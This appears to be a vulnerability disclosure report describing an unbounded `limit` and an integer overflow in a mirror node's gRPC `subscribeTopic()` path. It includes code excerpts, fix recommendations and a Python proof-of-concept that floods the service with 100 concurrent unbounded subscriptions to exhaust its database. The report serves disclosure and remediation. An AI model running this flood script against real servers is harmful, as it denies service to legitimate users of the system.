### Title
Unauthenticated Unbounded `limit` in `subscribeTopic()` Enables Historical-Message Flood DoS

### Summary
`ConsensusController.subscribeTopic()` accepts a `ConsensusTopicQuery` from any unauthenticated caller and passes the client-supplied `limit` field directly to `TopicMessageFilter` with no upper-bound validation. Because no authentication, per-IP rate limiting, or maximum-limit cap exists on the gRPC service, an attacker can open many connections and issue concurrent subscriptions with `limit = Long.MAX_VALUE` and `startTime = 0`, forcing the server to page through every historical message in the database for each subscription, exhausting the DB connection pool and degrading service for legitimate subscribers.

### Finding Description

**Exact code path:**

`ConsensusController.java`, `toFilter()`, line 56:
```java
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
```
`query.getLimit()` is a raw `uint64` from the wire with no cap applied. [1](#0-0) 

`TopicMessageFilter.java` only enforces `@Min(0)` — no `@Max`:
```java
@Min(0)
private long limit;
``` [2](#0-1) 

`TopicMessageServiceImpl.subscribeTopic()` applies `flux.take(filter.getLimit())` only after the full historical retrieval pipeline runs:
```java
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit());
}
``` [3](#0-2) 

`PollingTopicMessageRetriever.poll()` computes the per-page DB limit as:
```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getTotal().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, context.getMaxPageSize());
``` [4](#0-3) 

When `filter.getLimit() = Long.MAX_VALUE`, the cast `(int)(Long.MAX_VALUE - 0L)` overflows to `-1`, making `pageSize = Math.min(-1, 1000) = -1`. This negative value is forwarded to the repository query, which in PostgreSQL interprets `LIMIT -1` as "no limit" — returning all rows in a single page instead of the configured `maxPageSize` of 1000. [5](#0-4) 

**No authentication exists on the gRPC service.** The only server-side concurrency control is `maxConcurrentCallsPerConnection = 5` (per connection), with no limit on the number of connections: [6](#0-5) [7](#0-6) 

The throttle/rate-limit infrastructure (`ThrottleConfiguration`, `ThrottleProperties`) exists only in the `web3` module and is not applied to the `grpc` module at all. [8](#0-7) 

**Root cause:** The failed assumption is that callers are trusted or that infrastructure-level controls (load balancer, API gateway) will enforce limits. Neither is guaranteed by the code itself.

### Impact Explanation

An attacker opening *N* TCP connections, each with 5 concurrent `subscribeTopic` calls (`limit = Long.MAX_VALUE`, `startTime = 0`, no `endTime`), generates `5N` simultaneous DB queries. Because the integer overflow causes `pageSize = -1` (PostgreSQL `LIMIT -1` = all rows), each query dumps the entire topic message table in one shot rather than the intended 1000-row pages, multiplying memory and I/O pressure. The DB connection pool is exhausted, causing legitimate subscribers to time out or receive errors. The `retrieverProperties.timeout` (default 60 s) is the only backstop, but the attacker simply reconnects immediately, maintaining continuous pressure.

### Likelihood Explanation

The gRPC port (default 5600) is publicly reachable by design (it is the mirror node's public API). No credentials, tokens, or API keys are required. The attack requires only a standard gRPC client library and a single script. It is trivially repeatable and automatable. The integer-overflow amplification (unbounded page size) makes even a modest number of connections (e.g., 20 connections × 5 calls = 100 concurrent queries each returning millions of rows) sufficient to saturate a typical deployment.

### Recommendation

1. **Cap `limit` at the controller layer** before building the filter — e.g., clamp to a configurable `maxLimit` (e.g., 10,000):
   ```java
   long rawLimit = query.getLimit();
   long cappedLimit = (rawLimit == 0) ? 0 : Math.min(rawLimit, grpcProperties.getMaxLimit());
   filter.limit(cappedLimit);
   ```
2. **Fix the integer overflow** in `PollingTopicMessageRetriever.poll()`: use `Math.min(Math.toIntExact(Math.min(remaining, Integer.MAX_VALUE)), maxPageSize)` or guard with a range check before casting.
3. **Add per-IP or per-connection rate limiting** to the gRPC service (e.g., via a gRPC `ServerInterceptor` using Bucket4j, mirroring the `web3` throttle pattern).
4. **Limit total concurrent subscriptions** globally (not just per connection) via a semaphore or connection-count interceptor.

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto import basic_types_pb2, timestamp_pb2

def flood(target="mirror-node:5600", connections=20):
    stubs = []
    for _ in range(connections):
        channel = grpc.insecure_channel(target)
        stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
        stubs.append(stub)

    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1000),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
        limit=(2**63 - 1),   # Long.MAX_VALUE → triggers int overflow in retriever
    )

    streams = []
    for stub in stubs:
        for _ in range(5):   # maxConcurrentCallsPerConnection
            streams.append(stub.subscribeTopic(query))

    # Drain all streams concurrently — server now runs 100 unbounded DB queries
    for stream in streams:
        for _ in stream:
            pass

flood()
```

Preconditions: network access to port 5600; a topic with historical messages in the DB. Expected result: DB connection pool exhaustion, legitimate subscribers receive `DEADLINE_EXCEEDED` or `UNAVAILABLE` errors within seconds.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
